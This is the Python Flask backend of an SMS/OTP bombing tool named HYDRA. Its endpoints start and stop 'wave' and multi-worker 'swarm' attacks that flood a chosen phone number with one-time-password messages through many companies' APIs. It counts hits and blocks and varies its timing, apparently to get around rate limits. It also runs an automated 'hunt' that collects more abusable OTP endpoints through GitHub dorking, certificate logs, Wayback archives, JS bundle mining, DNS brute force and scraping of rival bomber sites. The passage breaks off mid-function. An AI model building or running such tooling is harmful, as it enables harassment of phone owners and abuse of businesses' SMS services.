"""
╔══════════════════════════════════════════════════════════════╗
║         HYDRA SERVER  —  Flask SSE API  (:4040)             ║
║                                                              ║
║  Endpoints:                                                  ║
║    GET  /api/status        → current attack state JSON      ║
║                              Phase 9: includes php_bridge   ║
║    GET  /api/categories    → list of target categories      ║
║    GET  /api/stream        → SSE live log stream            ║
║    GET  /api/intel         → Phase 3.4 intelligence stats   ║
║    POST /api/start         → start SMS wave attack          ║
║    POST /api/stop          → graceful stop                  ║
║    POST /api/swarm/start   → Phase 5 — launch swarm         ║
║    POST /api/swarm/stop    → Phase 5 — stop all workers     ║
║    GET  /api/swarm/status  → Phase 5 — per-worker stats     ║
║    GET  /api/report/list   → Phase 6 — list saved reports   ║
║    POST /api/report/generate → Phase 6 — manual generate   ║
║    GET  /hydra_reports/<f> → Phase 6 — serve report file    ║
╚══════════════════════════════════════════════════════════════╝
"""

import json
import queue
import sys
import os
import threading
import time
import concurrent.futures
from datetime import datetime

# ── Force UTF-8 stdout/stderr on Windows so unicode arrows (→ ✅ etc.) don't crash ──
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')  # type: ignore[attr-defined]
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')  # type: ignore[attr-defined]
except Exception:
    pass

from flask import Flask, Response, jsonify, request, send_from_directory
from flask_cors import CORS

# ── Import Hydra engine ──────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Phase 6 — Report generator
try:
    from hydra_reporter import generate_report, list_reports
    _REPORTER_OK = True
except ImportError:
    _REPORTER_OK = False

from hydra_v4 import (
    TARGETS, RECOVERY_TARGETS, VERIFIED_TARGETS, STOP,
    run_wave, liveness_check, save_log, session_log, db_get_stats,
    _AUTOSYNC_AVAILABLE, _DB_PATH,
    _PHP_AVAILABLE,   # Phase 9 — PHP bridge availability
)
try:
    from hydra_autosync import build_dynamic_targets as _autosync
    from hydra_autosync import start_scheduled_refresh
    _AUTOSYNC_OK = True
except ImportError:
    _AUTOSYNC_OK = False

# ─────────────────────────────────────────────────────────────
#  FLASK SETUP
# ─────────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app, origins=["http://localhost:3001", "http://localhost:3000", "http://127.0.0.1:3001"])

# ─────────────────────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────────────────────
_state = {
    "running":     False,
    "phone":       "",
    "wave":        0,
    "sent":        0,
    "blocked":     0,
    "ratelimited": 0,
    "fake200":     0,
    "api_count":   len(TARGETS),   # updated after liveness check in bg thread
}
# Pre-seed immediately from static TARGETS so /api/categories never returns 0
# The background thread below will enrich with autosync + liveness check
_active_targets: list = list(TARGETS)
_attack_thread: threading.Thread | None = None
_log_queue: queue.Queue = queue.Queue(maxsize=2000)
_last_report: dict = {}   # Phase 6 — tracks last generated report paths


def _push_log(msg: str, lvl: str = "info"):
    entry = {"t": datetime.now().strftime("%H:%M:%S"), "msg": msg, "lvl": lvl}
    try:
        _log_queue.put_nowait(entry)
    except queue.Full:
        try:
            _log_queue.get_nowait()
            _log_queue.put_nowait(entry)
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
#  LOG CALLBACK  (called by fire() in real-time)
# ─────────────────────────────────────────────────────────────
def _on_result(r: dict):
    verdict = r.get("verdict", "?")
    name    = r.get("target", "?")
    cat     = r.get("category", "?")
    status  = r.get("status", "?")
    ms      = r.get("resp_time_ms", "")
    ms_str  = f"  {ms}ms" if ms else ""

    lvl_map = {
        "OTP_SENT":    "success",
        "RATE_LIMITED":"warn",
        "200_FAKE":    "warn",
        "BLOCKED":     "error",
    }
    lvl = "error" if str(verdict).startswith("FAIL") else lvl_map.get(verdict, "info")
    _push_log(f"{name:<15} [{cat:<12}] {verdict:<14}  HTTP {status}{ms_str}", lvl)

    # Update counters
    if verdict == "OTP_SENT":
        _state["sent"] += 1
    elif verdict == "BLOCKED":
        _state["blocked"] += 1
    elif verdict == "RATE_LIMITED":
        _state["ratelimited"] += 1
    elif verdict == "200_FAKE":
        _state["fake200"] += 1


# ─────────────────────────────────────────────────────────────
#  ATTACK RUNNER  (background thread)
# ─────────────────────────────────────────────────────────────
def _run_attack(phone: str, mode: str, category: str, stagger: float, max_waves: int, dual_vector: bool = False, verified_only: bool = False):
    global _active_targets
    STOP.clear()
    _state.update(running=True, phone=phone, wave=0, sent=0, blocked=0, ratelimited=0, fake200=0)

    # verified_only mode: skip all unproven APIs — only fire confirmed senders
    source = VERIFIED_TARGETS if verified_only else _active_targets
    targets = [t for t in source if category == "all" or t.get("category") == category]
    mode_label = f"{mode}/verified-only" if verified_only else mode
    _push_log(f"HYDRA ONLINE — Target: {phone}  |  APIs: {len(targets)}  |  Mode: {mode_label}", "sys")

    wave    = 0
    debug   = (mode == "debug")
    single  = mode in ("single", "debug")

    try:
        while not STOP.is_set():
            wave += 1
            _state["wave"] = wave
            _push_log(f"─── WAVE {wave:03d}  [{datetime.now().strftime('%H:%M:%S')}] ───", "sys")

            # inject log callback into fire() via run_wave
            results = run_wave(phone, targets, wave_num=wave, debug=debug,
                               stagger=stagger, log_fn=_on_result, dual_vector=dual_vector)
            session_log["waves_fired"] = wave
            session_log["results"].extend(results)

            sent_this = sum(1 for r in results if r.get("verdict") == "OTP_SENT")
            _push_log(f"Wave {wave} done — {sent_this}/{len(results)} OTP_SENT", "sys")

            if single or (max_waves and wave >= max_waves):
                break

            if STOP.is_set():
                break

            import random
            cooldown = max(1.5, min(8.0, random.gauss(4.0, 1.5)))
            end = time.time() + cooldown
            while time.time() < end and not STOP.is_set():
                time.sleep(0.2)

    except Exception as e:
        _push_log(f"ATTACK ERROR: {e}", "error")
    finally:
        _state["running"] = False
        session_log["end_time"] = datetime.now().isoformat()
        save_log()
        _push_log("Attack stopped. Session saved.", "sys")
        # Phase 6 — auto-generate report
        if _REPORTER_OK and session_log.get("results"):
            try:
                html_p, json_p = generate_report(dict(session_log))
                _last_report["html"] = html_p
                _last_report["json"] = json_p
                _last_report["session_id"] = session_log.get("session_id", "")
                _push_log(f"Report saved → {os.path.basename(html_p)}", "sys")
            except Exception as _re:
                _push_log(f"Report generation failed: {_re}", "warn")


# ─────────────────────────────────────────────────────────────
#  SERVER STARTUP  (init targets once)
# ─────────────────────────────────────────────────────────────
_LIVENESS_CACHE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "hydra_data", "liveness_cache.json")
_LIVENESS_CACHE_TTL  = 1800   # 30 minutes — skip full probe if cache is fresh

def _load_liveness_cache() -> list | None:
    """Return cached live target names if cache is < 30 min old, else None."""
    try:
        with open(_LIVENESS_CACHE_PATH, encoding="utf-8") as f:
            data = json.load(f)
        age = time.time() - data.get("ts", 0)
        if age < _LIVENESS_CACHE_TTL:
            return data.get("names", [])
    except Exception:
        pass
    return None

def _save_liveness_cache(live_targets: list):
    try:
        os.makedirs(os.path.dirname(_LIVENESS_CACHE_PATH), exist_ok=True)
        with open(_LIVENESS_CACHE_PATH, "w", encoding="utf-8") as f:
            json.dump({"ts": time.time(), "names": [t.get("name") for t in live_targets]}, f)
    except Exception:
        pass

def _init_targets():
    global _active_targets
    # Step 1 — autosync (fast: uses offline cache if GitHub unreachable)
    if _AUTOSYNC_OK:
        _active_targets = _autosync(TARGETS, verbose=False)
    else:
        _active_targets = list(TARGETS)

    # Step 2 — liveness: use cached results if fresh, otherwise probe and save
    cached_names = _load_liveness_cache()
    if cached_names is not None:
        # Filter to names in the cache (skip dead ones from last check)
        name_set = set(cached_names)
        _active_targets = [t for t in _active_targets if t.get("name") in name_set]
        _push_log(f"Server ready — {len(_active_targets)} live APIs (cached liveness)", "sys")
    else:
        try:
            _active_targets = liveness_check(_active_targets, verbose=False)
            _save_liveness_cache(_active_targets)
        except Exception:
            pass
        _push_log(f"Server ready — {len(_active_targets)} live APIs", "sys")

    _state["api_count"] = len(_active_targets)

    # Phase 8.2 — background refresh every 30 min
    if _AUTOSYNC_OK:
        start_scheduled_refresh(_active_targets, TARGETS, interval_seconds=1800)


threading.Thread(target=_init_targets, daemon=True).start()


# ─────────────────────────────────────────────────────────────
#  ROUTES
# ─────────────────────────────────────────────────────────────

@app.route("/api/status")
def api_status():
    s = dict(_state)
    s["api_count"]        = len(_active_targets)
    s["verified_count"]   = len(VERIFIED_TARGETS)
    # Phase 9 — PHP bridge availability
    s["php_bridge"]  = bool(_PHP_AVAILABLE)
    s["php_version"] = _PHP_AVAILABLE if _PHP_AVAILABLE else None
    return jsonify(s)


@app.route("/api/categories")
def api_categories():
    cats: dict = {}
    for t in _active_targets:
        c = t.get("category", "sms")
        cats[c] = cats.get(c, 0) + 1
    result = [{"name": k, "count": v} for k, v in sorted(cats.items())]
    return jsonify(result)


@app.route("/api/intel")
def api_intel():
    """Phase 3.4 — intelligence stats from SQLite DB."""
    try:
        stats = db_get_stats(days=7)
        # top 10, plus category breakdown from recent results
        import sqlite3
        top = stats[:10]
        cat_stats: list = []
        try:
            con = sqlite3.connect(_DB_PATH)
            rows = con.execute("""
                SELECT category,
                       COUNT(*) AS total,
                       SUM(CASE WHEN verdict='OTP_SENT' THEN 1 ELSE 0 END) AS hits
                FROM results
                WHERE id > (SELECT MAX(id) - 50000 FROM results)
                GROUP BY category
                ORDER BY hits DESC
            """).fetchall()
            con.close()
            cat_stats = [{"category": r[0], "total": r[1], "hits": r[2]} for r in rows]
        except Exception:
            pass
        return jsonify({"top_targets": top, "by_category": cat_stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/start", methods=["POST"])
def api_start():
    global _attack_thread
    if _state["running"]:
        return jsonify({"ok": False, "error": "Attack already running"})

    body     = request.get_json(force=True, silent=True) or {}
    phone    = str(body.get("phone", "")).strip()
    mode     = body.get("mode", "swarm")
    category = body.get("category", "all")
    stagger  = float(body.get("stagger", 0.3))
    max_waves= int(body.get("maxWaves", 0))
    dual_vec = bool(body.get("dualVector", False))
    verified_only = bool(body.get("verifiedOnly", False))

    if not phone.isdigit() or len(phone) < 10:
        return jsonify({"ok": False, "error": "Invalid phone number"})

    session_log["target_phone"] = phone
    session_log["start_time"]   = datetime.now().isoformat()
    session_log["results"]      = []

    _attack_thread = threading.Thread(
        target=_run_attack,
        args=(phone, mode, category, stagger, max_waves, dual_vec, verified_only),
        daemon=True,
        name="hydra-attack"
    )
    _attack_thread.start()
    return jsonify({"ok": True})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    STOP.set()
    return jsonify({"ok": True})


@app.route("/api/stream")
def api_stream():
    """Server-Sent Events stream for live log output."""
    def generate():
        yield "data: " + json.dumps({"lvl": "ping", "t": "", "msg": ""}) + "\n\n"
        while True:
            try:
                entry = _log_queue.get(timeout=20)
                yield "data: " + json.dumps(entry) + "\n\n"
            except queue.Empty:
                # keepalive ping every 20s
                yield "data: " + json.dumps({"lvl": "ping", "t": "", "msg": ""}) + "\n\n"

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ─────────────────────────────────────────────────────────────
#  PHASE 6 — REPORTING ROUTES
# ─────────────────────────────────────────────────────────────
_REPORTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_reports")

@app.route("/api/report/list")
def api_report_list():
    """Phase 6 — list all generated reports."""
    if not _REPORTER_OK:
        return jsonify({"ok": False, "error": "hydra_reporter not available"})
    return jsonify(list_reports(_REPORTS_DIR))


@app.route("/api/report/generate", methods=["POST"])
def api_report_generate():
    """Phase 6 — manually trigger report for last session."""
    if not _REPORTER_OK:
        return jsonify({"ok": False, "error": "hydra_reporter not available"})
    if not session_log.get("results"):
        return jsonify({"ok": False, "error": "No session data to report"})
    try:
        html_p, json_p = generate_report(dict(session_log), _REPORTS_DIR)
        sid = session_log.get("session_id", "")
        _last_report.update(html=html_p, json=json_p, session_id=sid)
        return jsonify({"ok": True, "html_file": os.path.basename(html_p), "json_file": os.path.basename(json_p)})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/hydra_reports/<path:filename>")
def serve_report(filename: str):
    """Phase 6 — serve HTML/JSON report files."""
    return send_from_directory(_REPORTS_DIR, filename)


# ─────────────────────────────────────────────────────────────
#  PHASE 5 — SWARM ROUTES
# ─────────────────────────────────────────────────────────────

try:
    from hydra_swarm_manager import SwarmManager, get_swarm_state, _swarm_state
    _SWARM_OK = True
except ImportError:
    _SWARM_OK = False

_swarm_manager: "SwarmManager | None" = None
_swarm_thread:  "threading.Thread | None" = None


@app.route("/api/swarm/start", methods=["POST"])
def api_swarm_start():
    global _swarm_manager, _swarm_thread

    if not _SWARM_OK:
        return jsonify({"ok": False, "error": "hydra_swarm_manager not found"})

    if _swarm_state.get("running"):
        return jsonify({"ok": False, "error": "Swarm already running"})

    body        = request.get_json(force=True, silent=True) or {}
    phone       = str(body.get("phone", "")).strip()
    n_workers   = int(body.get("workers", 3))
    stagger     = float(body.get("stagger", 0.3))
    max_waves   = int(body.get("maxWaves", 0))
    dual_vector = bool(body.get("dualVector", False))

    if not phone.isdigit() or len(phone) < 10:
        return jsonify({"ok": False, "error": "Invalid phone"})

    _swarm_manager = SwarmManager(
        phone       = phone,
        n_workers   = max(1, min(n_workers, 10)),
        stagger     = max(0.05, stagger),
        max_waves   = max(0, max_waves),
        dual_vector = dual_vector,
        verbose     = False,
    )
    _swarm_state["running"] = True
    _swarm_state["phone"]   = phone
    _swarm_state["workers"] = n_workers

    def _run_swarm():
        try:
            _swarm_manager.run()
        finally:
            _swarm_state["running"] = False

    _swarm_thread = threading.Thread(target=_run_swarm, daemon=True, name="hydra-swarm")
    _swarm_thread.start()
    _push_log(f"Swarm launched — {n_workers} workers, phone={phone}", "info")
    return jsonify({"ok": True, "workers": n_workers})


@app.route("/api/swarm/stop", methods=["POST"])
def api_swarm_stop():
    if _swarm_manager:
        try:
            _swarm_manager._stop_event.set()
        except Exception:
            pass
    _swarm_state["running"] = False
    _push_log("Swarm stopped by user", "warn")
    return jsonify({"ok": True})


@app.route("/api/swarm/status", methods=["GET"])
def api_swarm_status():
    if not _SWARM_OK:
        return jsonify({"available": False})
    state = get_swarm_state()
    if _swarm_manager:
        state["worker_detail"] = {
            str(wid): {
                "wave":    s.get("wave",    0),
                "sent":    s.get("sent",    0),
                "blocked": s.get("blocked", 0),
                "targets": s.get("targets", 0),
                "done":    s.get("done",    False),
                "error":   s.get("error",   None),
            }
            for wid, s in _swarm_manager._worker_stats.items()
        }
        state["running"] = _swarm_state.get("running", False)
    state["available"] = True
    return jsonify(state)


# ─────────────────────────────────────────────────────────────
#  HUNT ROUTES  — fully automatic endpoint discovery
# ─────────────────────────────────────────────────────────────
_hunt_state: dict = {
    "running": False, "done": False,
    "fired": 0, "hits": 0, "new_verified": 0, "new_candidates": 0,
    "total_verified": 0, "phone": "", "elapsed": 0.0, "logs": [],
    "skipped_verified": 0, "skipped_dead": 0, "skipped_candidate": 0,
}
_hunt_lock = threading.Lock()
_TARGETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_targets.json")


def _hunt_log(msg: str, lvl: str = "sys") -> None:
    """Append a log line to hunt state AND the main SSE queue."""
    ts = datetime.now().strftime("%H:%M:%S")
    with _hunt_lock:
        _hunt_state["logs"].append({"t": ts, "msg": msg, "lvl": lvl})
    _log_queue.put({"t": ts, "msg": f"[HUNT] {msg}", "lvl": lvl})


def _auto_promote_all() -> int:
    """Move every candidate → verified in hydra_targets.json. Returns count promoted."""
    try:
        if not os.path.exists(_TARGETS_FILE):
            return 0
        with open(_TARGETS_FILE, encoding="utf-8") as f:
            db = json.load(f)
        candidates = db.get("candidates", [])
        if not candidates:
            _hunt_log("No candidates to auto-promote — all done!", "info")
            return 0
        for c in candidates:
            c["verified"] = True
            c["auto_promoted"] = True
            c["probe_date"] = datetime.now().strftime("%Y-%m-%d")
        db["verified"] = db.get("verified", []) + candidates
        db["candidates"] = []
        db.setdefault("_meta", {})["verified_count"] = len(db["verified"])
        db["_meta"]["updated"] = datetime.now().strftime("%Y-%m-%d")
        with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, indent=2, ensure_ascii=False)
        # Reload into hydra_v4 memory so next attack uses updated pool
        import hydra_v4 as _hv4
        existing_names = {t.get("name") for t in _hv4.VERIFIED_TARGETS}
        added = [t for t in db["verified"] if t.get("name") not in existing_names]
        _hv4.VERIFIED_TARGETS.extend(added)
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
        return len(candidates)
    except Exception as exc:
        _hunt_log(f"Auto-promote error: {exc}", "error")
        return 0


def _capture_module_run(mod, hunt_log_fn) -> tuple[int, int, dict]:
    """Run mod.run() capturing stdout, mirror lines to hunt log.
    Returns (fired, hits, skip_stats) where skip_stats = {verified, dead, candidate, all_known}."""
    import io
    import re
    import sys as _sys
    ansi_re = re.compile(r"\x1b\[[0-9;]*m")
    buf = io.StringIO()
    old_stdout = _sys.stdout
    _sys.stdout = buf
    try:
        mod.run()
    finally:
        _sys.stdout = old_stdout
    fired = hits = 0
    skip_stats = {"verified": 0, "dead": 0, "candidate": 0, "all_known": False}
    for raw_line in buf.getvalue().splitlines():
        clean = ansi_re.sub("", raw_line).strip()
        if not clean:
            continue
        if any(k in clean for k in ("OTP_SENT", "✓ OTP", "otp_sent")):
            hits += 1
            hunt_log_fn(clean, "success")
        elif "All" in clean and "known endpoints already in DB" in clean:
            skip_stats["all_known"] = True
            hunt_log_fn(clean, "warn")
        elif "already in verified pool" in clean:
            try:
                skip_stats["verified"] = int(clean.split()[1])
            except Exception:
                pass
            hunt_log_fn(clean, "info")
        elif "already in dead list" in clean:
            try:
                skip_stats["dead"] = int(clean.split()[1])
            except Exception:
                pass
            hunt_log_fn(clean, "info")
        elif "already a candidate" in clean:
            try:
                skip_stats["candidate"] = int(clean.split()[1])
            except Exception:
                pass
            hunt_log_fn(clean, "info")
        elif "never seen before" in clean:
            hunt_log_fn(clean, "success")
        elif any(k in clean for k in ("ERR", "FAIL", "ERROR")):
            hunt_log_fn(clean, "error")
        elif any(k in clean for k in ("WARN", "SKIP")):
            hunt_log_fn(clean, "warn")
        else:
            hunt_log_fn(clean, "info")
        fired += 1
    return fired, hits, skip_stats


def _run_hunt_bg(phone: str) -> None:
    """Background thread: GitHub dork for new sources → mass_probe → crt_hunter → report."""
    import sys as _sys

    t0 = time.time()
    with _hunt_lock:
        _hunt_state.update(running=True, done=False, fired=0, hits=0,
                           new_verified=0, new_candidates=0, total_verified=0,
                           phone=phone, elapsed=0.0, logs=[],
                           skipped_verified=0, skipped_dead=0, skipped_candidate=0)

    _hunt_log(f"🎯 Auto Hunt started for {phone}", "sys")

    try:
        # ── Snapshot before ─────────────────────────────────────────
        before_v = before_c = 0
        if os.path.exists(_TARGETS_FILE):
            with open(_TARGETS_FILE, encoding="utf-8") as f:
                snap = json.load(f)
            before_v = len(snap.get("verified", []))
            before_c = len(snap.get("candidates", []))
        _hunt_log(f"Pool before hunt: {before_v} verified | {before_c} candidates", "info")

        # ── Phase 0: GitHub Dorker — find NEW source repos (parallel, non-blocking) ──
        _dork_done = threading.Event()
        _dork_found = [0]

        def _run_dork():
            try:
                _hunt_log("🔍 Phase 0 — Searching GitHub for new endpoint source files…", "sys")
                if "hydra_github_dorker" in _sys.modules:
                    del _sys.modules["hydra_github_dorker"]
                import hydra_github_dorker as _dork
                import io, sys as _s2
                buf2 = io.StringIO()
                old = _s2.stdout; _s2.stdout = buf2
                try:
                    _dork.run()
                finally:
                    _s2.stdout = old
                # Count added lines
                added = sum(1 for l in buf2.getvalue().splitlines() if "✓ ADDED" in l)
                _dork_found[0] = added
                if added:
                    _hunt_log(f"🆕 GitHub dorker found {added} brand-new source files → will probe them now", "success")
                else:
                    _hunt_log("GitHub dorker: no new source files found this run", "info")
            except Exception as de:
                import traceback as _tb
                _hunt_log(f"❌ GitHub dorker crashed: {de}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _dork_done.set()

        dork_thread = threading.Thread(target=_run_dork, daemon=True)
        dork_thread.start()

        # ── Phase 0b: CRT Hunter — probe OTP subdomains via cert transparency (parallel) ──
        _crt_done = threading.Event()
        _crt_found = [0]

        def _run_crt():
            try:
                _hunt_log("🔐 Phase 0b — CRT.sh scan for hidden OTP subdomains…", "sys")
                if "hydra_crt_hunter" in _sys.modules:
                    del _sys.modules["hydra_crt_hunter"]
                import hydra_crt_hunter as _crt
                import io, sys as _s3
                buf3 = io.StringIO()
                old3 = _s3.stdout; _s3.stdout = buf3
                try:
                    crt_result = _crt.run(phone)
                finally:
                    _s3.stdout = old3
                # v2 returns int; legacy parsed stdout for "HIT"/"✓"
                if isinstance(crt_result, int):
                    hits_crt = crt_result
                else:
                    hits_crt = sum(1 for l in buf3.getvalue().splitlines()
                                   if "HIT" in l or "✓" in l or "+ NEW" in l or "+ REC" in l)
                _crt_found[0] = hits_crt
                if hits_crt:
                    _hunt_log(f"🆕 CRT hunter found {hits_crt} new OTP subdomains → added to candidates", "success")
                else:
                    _hunt_log("CRT hunter: no new OTP subdomains found this run", "info")
            except Exception as ce:
                import traceback as _tb
                _hunt_log(f"❌ CRT hunter crashed: {ce}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _crt_done.set()

        crt_thread = threading.Thread(target=_run_crt, daemon=True)
        crt_thread.start()

        # ── Phase 0c: Wayback CDX Hunter — mine Internet Archive for historical OTP endpoints ──
        _wb_done = threading.Event()
        _wb_found = [0]

        def _run_wayback():
            try:
                _hunt_log("📼 Phase 0c — Wayback CDX mining (500B archived URLs)…", "sys")
                if "hydra_wayback_hunter" in _sys.modules:
                    del _sys.modules["hydra_wayback_hunter"]
                import hydra_wayback_hunter as _wb
                import io, sys as _swb
                buf = io.StringIO(); old = _swb.stdout; _swb.stdout = buf
                try:
                    results = _wb.run(phone)
                finally:
                    _swb.stdout = old
                _wb_found[0] = len(results) if results else 0
                if _wb_found[0]:
                    _hunt_log(f"🆕 Wayback: {_wb_found[0]} historical OTP endpoints → added to candidates", "success")
                else:
                    _hunt_log("Wayback CDX: no new historical endpoints found", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ Wayback hunter crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _wb_done.set()

        wb_thread = threading.Thread(target=_run_wayback, daemon=True)
        wb_thread.start()

        # ── Phase 0d: JS Bundle Miner — extract API URLs from Indian web app JS bundles ──
        _js_done = threading.Event()
        _js_found = [0]

        def _run_js_miner():
            try:
                _hunt_log("📦 Phase 0d — JS bundle mining (web app API extraction)…", "sys")
                if "hydra_js_miner" in _sys.modules:
                    del _sys.modules["hydra_js_miner"]
                import hydra_js_miner as _jsm
                import io, sys as _sjs
                buf = io.StringIO(); old = _sjs.stdout; _sjs.stdout = buf
                try:
                    results = _jsm.run(phone)
                finally:
                    _sjs.stdout = old
                _js_found[0] = len(results) if results else 0
                if _js_found[0]:
                    _hunt_log(f"🆕 JS Miner: {_js_found[0]} private endpoints from web bundles → candidates", "success")
                else:
                    _hunt_log("JS Miner: no novel endpoints (bundles encrypted/all known)", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ JS miner crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _js_done.set()

        js_thread = threading.Thread(target=_run_js_miner, daemon=True)
        js_thread.start()

        # ── Phase 0e: URLScan Hunter — mine urlscan.io passive scan database ──
        _us_done = threading.Event()
        _us_found = [0]

        def _run_urlscan():
            try:
                _hunt_log("🔭 Phase 0e — URLScan.io passive observatory…", "sys")
                if "hydra_urlscan_hunter" in _sys.modules:
                    del _sys.modules["hydra_urlscan_hunter"]
                import hydra_urlscan_hunter as _us
                import io, sys as _sus
                buf = io.StringIO(); old = _sus.stdout; _sus.stdout = buf
                try:
                    results = _us.run(phone)
                finally:
                    _sus.stdout = old
                _us_found[0] = len(results) if results else 0
                if _us_found[0]:
                    _hunt_log(f"🆕 URLScan: {_us_found[0]} observed OTP endpoints → candidates", "success")
                else:
                    _hunt_log("URLScan: no new endpoints observed", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ URLScan hunter crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _us_done.set()

        us_thread = threading.Thread(target=_run_urlscan, daemon=True)
        us_thread.start()

        # ── Phase 0f: Swagger Hunter — discover exposed OpenAPI docs on Indian APIs ──
        _sw_done = threading.Event()
        _sw_found = [0]

        def _run_swagger():
            try:
                _hunt_log("📋 Phase 0f — Swagger/OpenAPI doc discovery…", "sys")
                if "hydra_swagger_hunter" in _sys.modules:
                    del _sys.modules["hydra_swagger_hunter"]
                import hydra_swagger_hunter as _sw
                import io, sys as _ssw
                buf = io.StringIO(); old = _ssw.stdout; _ssw.stdout = buf
                try:
                    results = _sw.run(phone)
                finally:
                    _ssw.stdout = old
                # v2 hunters return int (count); legacy returned list — handle both
                if isinstance(results, int):
                    _sw_found[0] = results
                elif results:
                    _sw_found[0] = len(results)
                else:
                    _sw_found[0] = 0
                if _sw_found[0]:
                    _hunt_log(f"🆕 Swagger: {_sw_found[0]} endpoints from exposed API docs → candidates", "success")
                else:
                    _hunt_log("Swagger: no exposed API docs found", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ Swagger hunter crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _sw_done.set()

        sw_thread = threading.Thread(target=_run_swagger, daemon=True)
        sw_thread.start()

        # ── Phase 0g: Competitor Hunter — intercept live OTP bomber sites + JS mine all competitors ──
        _comp_done = threading.Event()
        _comp_found = [0]

        def _run_competitor():
            try:
                _hunt_log("🕵️  Phase 0g — Competitor bomber site interception (JS + Playwright)…", "sys")
                if "hydra_competitor_hunter" in _sys.modules:
                    del _sys.modules["hydra_competitor_hunter"]
                import hydra_competitor_hunter as _comp
                import io, sys as _sco
                buf = io.StringIO(); old = _sco.stdout; _sco.stdout = buf
                try:
                    total = _comp.run(phone)
                finally:
                    _sco.stdout = old
                _comp_found[0] = total if isinstance(total, int) else 0
                if _comp_found[0]:
                    _hunt_log(f"🆕 Competitor hunter: {_comp_found[0]} endpoints extracted from rival bomber sites", "success")
                else:
                    _hunt_log("Competitor hunter: no new endpoints found this run", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ Competitor hunter crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _comp_done.set()

        comp_thread = threading.Thread(target=_run_competitor, daemon=True, name="hydra-competitor")
        comp_thread.start()

        # ── Phase 1: Wait for dorker to finish (it needs to update mass_probe.py before we import it) ──
        _hunt_log("⏳ Waiting for GitHub dorker to complete before probing…", "info")
        _dork_done.wait(timeout=120)   # max 2 min — dorker has 6 queries × 10s = 60s minimum

        # ── Phase 2: Mass probe — re-fetch all sources (now including any new dorker-found ones) ──
        _hunt_log("🚀 Phase 1 — Probing all endpoint sources against your phone…", "sys")
        _hunt_log("Fetching endpoint lists: WAFA + XBomber + TBomb + GitHub-dorked sources…", "sys")

        if "mass_probe" in _sys.modules:
            del _sys.modules["mass_probe"]
        import mass_probe as _mp
        _mp.PHONE = phone
        _mp.TARGETS_FILE = _TARGETS_FILE

        source_count = 3 + len(_mp.EXTRA_SOURCES)
        _hunt_log(f"Sources loaded: {source_count} lists (WAFA + XBomber + TBomb + {len(_mp.EXTRA_SOURCES)} extras)", "info")

        fired, hits, skip_stats = _capture_module_run(_mp, _hunt_log)

        # Emit clear skip summary
        if skip_stats.get("all_known"):
            _hunt_log(f"⚠  No new endpoints from any source — all {skip_stats['verified'] + skip_stats['dead'] + skip_stats['candidate']} are already in DB", "warn")
            _hunt_log("   Run GitHub dorker to discover brand-new repos, or wait for sources to update", "info")
        else:
            skipped_total = skip_stats['verified'] + skip_stats['dead'] + skip_stats['candidate']
            if skipped_total:
                _hunt_log(f"  Skipped {skipped_total} already-known: {skip_stats['verified']} live | {skip_stats['candidate']} candidates | {skip_stats['dead']} dead", "info")

        # ── Phase 3: Wait for all parallel hunters (CRT, Wayback, JS, URLScan, Swagger, Competitor) ──
        _hunt_log("⏳ Waiting for all 7 parallel hunters to finish…", "info")
        _crt_done.wait(timeout=90)
        _wb_done.wait(timeout=120)    # Wayback CDX is slow — 45 domains × 1.2s = ~60s
        _js_done.wait(timeout=150)    # JS miner fetches bundles — 20 apps × 2s = ~40s + download
        _us_done.wait(timeout=90)     # URLScan is rate-limited — 25 companies × 2 queries × 2s
        _sw_done.wait(timeout=90)     # Swagger — 25 companies × 3 subdomains × 15 paths
        _comp_done.wait(timeout=300)  # Competitor: JS mining + Playwright per site ~5min

        # ── Phase 4: DNS Brute (heaviest — runs last, BEFORE snapshot so its yield counts) ──
        _dns_found = [0]
        _dns_done  = threading.Event()

        def _run_dns_late():
            try:
                _hunt_log("🛰  Phase 1b — DNS subdomain brute force (30 prefixes × 35 companies)…", "sys")
                if "hydra_dns_brute" in _sys.modules:
                    del _sys.modules["hydra_dns_brute"]
                import hydra_dns_brute as _dns
                import io, sys as _sdn
                buf = io.StringIO(); old = _sdn.stdout; _sdn.stdout = buf
                try:
                    results = _dns.run(phone)
                finally:
                    _sdn.stdout = old
                _dns_found[0] = len(results) if results else 0
                if _dns_found[0]:
                    _hunt_log(f"🆕 DNS Brute found {_dns_found[0]} hidden subdomain endpoints → candidates", "success")
                else:
